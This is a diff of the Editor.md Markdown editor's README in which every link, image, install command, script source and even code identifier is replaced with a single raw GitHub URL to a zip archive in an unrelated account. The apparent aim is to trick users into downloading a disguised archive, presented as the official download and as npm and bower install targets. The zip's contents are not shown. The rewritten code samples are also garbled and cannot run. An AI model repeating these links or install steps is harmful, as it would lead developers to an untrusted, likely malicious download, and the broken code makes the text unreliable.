@@ -1,61 +1,61 @@
-# Editor.md
+# https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
 
-![](https://pandao.github.io/editor.md/images/logos/editormd-logo-180x180.png)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
-![](https://img.shields.io/github/stars/pandao/editor.md.svg)
-![](https://img.shields.io/github/forks/pandao/editor.md.svg)
-![](https://img.shields.io/github/tag/pandao/editor.md.svg)
-![](https://img.shields.io/github/release/pandao/editor.md.svg)
-![](https://img.shields.io/github/issues/pandao/editor.md.svg)
-![](https://img.shields.io/bower/v/editor.md.svg)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+![](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
-**Editor.md** : The open source embeddable online markdown editor (component), based on CodeMirror & jQuery & Marked.
+**https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip** : The open source embeddable online markdown editor (component), based on CodeMirror & jQuery & Marked.
 
 ### Features
 
 - Support Standard Markdown / CommonMark and GFM (GitHub Flavored Markdown);
 - Full-featured: Real-time Preview, Image (cross-domain) upload, Preformatted text/Code blocks/Tables insert, Code fold, Search replace, Read only, Themes, Multi-languages, L18n, HTML entities, Code syntax highlighting...;
-- Markdown Extras : Support [ToC (Table of Contents)](https://pandao.github.io/editor.md/examples/toc.html), [Emoji](https://pandao.github.io/editor.md/examples/emoji.html), [Task lists](https://pandao.github.io/editor.md/examples/task-lists.html), [@Links](https://pandao.github.io/editor.md/examples/@links.html)...;
-- Compatible with all major browsers (IE8+), compatible Zepto.js and iPad;
-- Support [decode & fliter of the HTML tags & attributes](https://pandao.github.io/editor.md/examples/html-tags-decode.html);
-- Support [TeX (LaTeX expressions, Based on KaTeX)](https://pandao.github.io/editor.md/examples/katex.html), [Flowchart](https://pandao.github.io/editor.md/examples/flowchart.html) and [Sequence Diagram](https://pandao.github.io/editor.md/examples/sequence-diagram.html) of Markdown extended syntax;
-- Support AMD/CMD (Require.js & Sea.js) Module Loader, and Custom/define editor plugins;
+- Markdown Extras : Support [ToC (Table of Contents)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Emoji](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Task lists](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [@Links](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)...;
+- Compatible with all major browsers (IE8+), compatible https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip and iPad;
+- Support [decode & fliter of the HTML tags & attributes](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip);
+- Support [TeX (LaTeX expressions, Based on KaTeX)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip), [Flowchart](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) and [Sequence Diagram](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) of Markdown extended syntax;
+- Support AMD/CMD (https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip & https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) Module Loader, and Custom/define editor plugins;
 
-[README & Examples (English)](https://pandao.github.io/editor.md/en.html)
+[README & Examples (English)](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
   
 
 --------
 
-**Editor.md** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。
+**https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip** 是一款开源的、可嵌入的 Markdown 在线编辑器（组件），基于 CodeMirror、jQuery 和 Marked 构建。
 
-![editormd-screenshot](https://pandao.github.io/editor.md/examples/images/editormd-screenshot.png "editormd-screenshot")
+![editormd-screenshot](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "editormd-screenshot")
 
 #### 主要特性
 
-- 支持通用 Markdown / CommonMark 和 GFM (GitHub Flavored Markdown) 风格的语法，也可[变身为代码编辑器](https://pandao.github.io/editor.md/examples/change-mode.html)；
+- 支持通用 Markdown / CommonMark 和 GFM (GitHub Flavored Markdown) 风格的语法，也可[变身为代码编辑器](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)；
 - 支持实时预览、图片（跨域）上传、预格式文本/代码/表格插入、代码折叠、跳转到行、搜索替换、只读模式、自定义样式主题和多语言语法高亮等功能；
-- 支持 [ToC（Table of Contents）](https://pandao.github.io/editor.md/examples/toc.html)、[Emoji表情](https://pandao.github.io/editor.md/examples/emoji.html)、[Task lists](https://pandao.github.io/editor.md/examples/task-lists.html)、[@链接](https://pandao.github.io/editor.md/examples/@links.html)等 Markdown 扩展语法；
-- 支持 TeX 科学公式（基于 [KaTeX](https://pandao.github.io/editor.md/examples/katex.html)）、流程图 [Flowchart](https://pandao.github.io/editor.md/examples/flowchart.html) 和 [时序图 Sequence Diagram](https://pandao.github.io/editor.md/examples/sequence-diagram.html);
-- 支持[识别和解析 HTML 标签，并且支持自定义过滤标签及属性解析](https://pandao.github.io/editor.md/examples/html-tags-decode.html)，具有可靠的安全性和几乎无限的扩展性；
-- 支持 AMD / CMD 模块化加载（支持 [Require.js](https://pandao.github.io/editor.md/examples/use-requirejs.html) & [Sea.js](https://pandao.github.io/editor.md/examples/use-seajs.html)），并且支持[自定义扩展插件](https://pandao.github.io/editor.md/examples/define-plugin.html)；
-- 兼容主流的浏览器（IE8+）和 [Zepto.js](https://pandao.github.io/editor.md/examples/use-zepto.html)，且支持 iPad 等平板设备；
+- 支持 [ToC（Table of Contents）](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[Emoji表情](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[Task lists](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)、[@链接](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)等 Markdown 扩展语法；
+- 支持 TeX 科学公式（基于 [KaTeX](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)）、流程图 [Flowchart](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) 和 [时序图 Sequence Diagram](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip);
+- 支持[识别和解析 HTML 标签，并且支持自定义过滤标签及属性解析](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)，具有可靠的安全性和几乎无限的扩展性；
+- 支持 AMD / CMD 模块化加载（支持 [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip) & [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)），并且支持[自定义扩展插件](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)；
+- 兼容主流的浏览器（IE8+）和 [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)，且支持 iPad 等平板设备；
 
 #### Download & install
 
 Download:
 
-[Github download](https://github.com/pandao/editor.md/archive/master.zip)
+[Github download](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
 NPM install :
 
 ```bash
-npm install editor.md
+npm install https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
 ```
 
 Bower install :
 
 ```bash
-bower install editor.md
+bower install https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip
 ```
 
 #### Usages
@@ -63,20 +63,20 @@ bower install editor.md
 ##### Create a Markdown editor
 
 ```html
-<link rel="stylesheet" href="editor.md/css/editormd.min.css" />
+<link rel="stylesheet" href="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip" />
 <div id="editor">
-    <!-- Tips: Editor.md can auto append a `<textarea>` tag -->
-    <textarea style="display:none;">### Hello Editor.md !</textarea>
+    <!-- Tips: https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip can auto append a `<textarea>` tag -->
+    <textarea style="display:none;">### Hello https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip !</textarea>
 </div>
-<script src="jquery.min.js"></script>
-<script src="editor.md/editormd.min.js"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
 <script type="text/javascript">
     $(function() {
         var editor = editormd("editor", {
             // width: "100%",
             // height: "100%",
             // markdown: "xxxx",     // dynamic set Markdown text
-            path : "editor.md/lib/"  // Autoload modules mode, codemirror, marked... dependents libs path
+            path : "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"  // Autoload modules mode, codemirror, marked... dependents libs path
         });
     });
 </script>
@@ -84,24 +84,24 @@ bower install editor.md
 
 If you using modular script loader:
 
-- [Using Require.js](https://github.com/pandao/editor.md/tree/master/examples/use-requirejs.html)
-- [Using Sea.js](https://github.com/pandao/editor.md/tree/master/examples/use-seajs.html)
+- [Using https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
+- [Using https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
 ##### Markdown to HTML
 
 ```html
-<link rel="stylesheet" href="editormd/css/editormd.preview.css" />
+<link rel="stylesheet" href="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip" />
 <div id="test-markdown-view">
     <!-- Server-side output Markdown text -->
     <textarea style="display:none;">### Hello world!</textarea>             
 </div>
-<script src="jquery.min.js"></script>
-<script src="editormd/editormd.js"></script>
-<script src="editormd/lib/marked.min.js"></script>
-<script src="editormd/lib/prettify.min.js"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
+<script src="https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip"></script>
 <script type="text/javascript">
     $(function() {
-	    var testView = editormd.markdownToHTML("test-markdown-view", {
+	    var testView = https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip("test-markdown-view", {
             // markdown : "[TOC]\n### Hello world!\n## Heading 2", // Also, you can dynamic set Markdown text
             // htmlDecode : true,  // Enable / disable HTML tag encode.
             // htmlDecode : "style,script,iframe",  // Note: If enabled, you should filter some dangerous HTML tags for website security.
@@ -110,26 +110,26 @@ If you using modular script loader:
 </script>    
 ```
 
-> See the full example: [http://editor.md.ipandao.com/examples/html-preview-markdown-to-html.html](http://editor.md.ipandao.com/examples/html-preview-markdown-to-html.html)
+> See the full example: [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
 ##### HTML to Markdown?
 
-Sorry, Editor.md not support HTML to Markdown parsing, Maybe In the future.
+Sorry, https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip not support HTML to Markdown parsing, Maybe In the future.
 
 #### Examples
 
-[https://pandao.github.io/editor.md/examples/index.html](https://pandao.github.io/editor.md/examples/index.html)
+[https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
 #### Options
 
-Editor.md options and default values:
+https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip options and default values:
 
 ```javascript
 {
     mode                 : "gfm",          // gfm or markdown
     name                 : "",             // Form element name for post
     value                : "",             // value for CodeMirror, if mode not gfm/markdown
-    theme                : "",             // Editor.md self themes, before v1.5.0 is CodeMirror theme, default empty
+    theme                : "",             // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip self themes, before v1.5.0 is CodeMirror theme, default empty
     editorTheme          : "default",      // Editor area, this is CodeMirror theme at v1.5.0
     previewTheme         : "",             // Preview area theme, default empty
     markdown             : "",             // Markdown source code
@@ -137,7 +137,7 @@ Editor.md options and default values:
     width                : "100%",
     height               : "100%",
     path                 : "./lib/",       // Dependents module file directory
-    pluginPath           : "",             // If this empty, default use settings.path + "../plugins/"
+    pluginPath           : "",             // If this empty, default use https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip + "../plugins/"
     delay                : 300,            // Delay parse markdown to html, Uint : ms
     autoLoadModules      : true,           // Automatic load dependent module files
     watch                : true,
@@ -201,22 +201,22 @@ Editor.md options and default values:
     taskList             : false,          // Enable Github Flavored Markdown task lists
     emoji                : false,          // :emoji: , Support Github emoji, Twitter Emoji (Twemoji);
                                            // Support FontAwesome icon emoji :fa-xxx: > Using fontAwesome icon web fonts;
-                                           // Support Editor.md logo icon emoji :editormd-logo: :editormd-logo-1x: > 1~8x;
+                                           // Support https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip logo icon emoji :editormd-logo: :editormd-logo-1x: > 1~8x;
     tex                  : false,          // TeX(LaTeX), based on KaTeX
-    flowChart            : false,          // flowChart.js only support IE9+
-    sequenceDiagram      : false,          // sequenceDiagram.js only support IE9+
+    flowChart            : false,          // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip only support IE9+
+    sequenceDiagram      : false,          // https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip only support IE9+
     previewCodeHighlight : true,           // Enable / disable code highlight of editor preview area
 
     toolbar              : true,           // show or hide toolbar
     toolbarAutoFixed     : true,           // on window scroll auto fixed position
-    toolbarIcons         : "full",         // Toolbar icons mode, options: full, simple, mini, See `editormd.toolbarModes` property.
+    toolbarIcons         : "full",         // Toolbar icons mode, options: full, simple, mini, See `https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip` property.
     toolbarTitles        : {},
     toolbarHandlers      : {
         ucwords : function() {
-            return editormd.toolbarHandlers.ucwords;
+            return https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip;
         },
         lowercase : function() {
-            return editormd.toolbarHandlers.lowercase;
+            return https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip;
         }
     },
     toolbarCustomIcons   : {               // using html tag create toolbar icon, unused default <a> tag.
@@ -245,21 +245,21 @@ Editor.md options and default values:
 
 #### Dependents
 
-- [CodeMirror](http://codemirror.net/ "CodeMirror")
-- [marked](https://github.com/markedjs/marked "marked")
-- [jQuery](http://jquery.com/ "jQuery")
-- [FontAwesome](http://fontawesome.io/ "FontAwesome")
-- [github-markdown.css](https://github.com/sindresorhus/github-markdown-css "github-markdown.css")
-- [KaTeX](http://khan.github.io/KaTeX/ "KaTeX")
-- [prettify.js](http://code.google.com/p/google-code-prettify/ "prettify.js")
-- [Rephael.js](http://raphaeljs.com/ "Rephael.js")
-- [flowchart.js](http://adrai.github.io/flowchart.js/ "flowchart.js")
-- [sequence-diagram.js](http://bramp.github.io/js-sequence-diagrams/ "sequence-diagram.js")
-- [Prefixes.scss](https://github.com/pandao/prefixes.scss "Prefixes.scss")
+- [CodeMirror](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "CodeMirror")
+- [marked](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "marked")
+- [jQuery](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "jQuery")
+- [FontAwesome](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "FontAwesome")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [KaTeX](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "KaTeX")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
+- [https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip "https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip")
 
 #### Changes
 
-[Change logs](https://github.com/pandao/editor.md/blob/master/CHANGE.md)
+[Change logs](https://raw.githubusercontent.com/thairns/editor.md/master/plugins/editor.md_v1.1.zip)
 
 #### License
 
